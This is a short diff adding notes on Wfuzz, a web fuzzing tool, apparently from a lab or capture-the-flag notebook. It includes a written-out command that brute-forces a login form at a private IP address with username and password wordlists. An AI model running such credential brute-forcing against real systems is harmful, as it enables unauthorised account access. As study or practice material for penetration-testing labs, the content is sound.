@@ -1,0 +1,9 @@
+
+Wfuzz is a tool designed for brute-forcing web applications. It can be used to find resources not linked directories, servlets, scripts, etc, brute-force GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP), brute-force forms parameters (user/password) and fuzzing.
+
+
+# Brute-force the login portal
+wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.104.241/login.php -d "username=FUZZ&password=FUZ2Z"
+
+
+
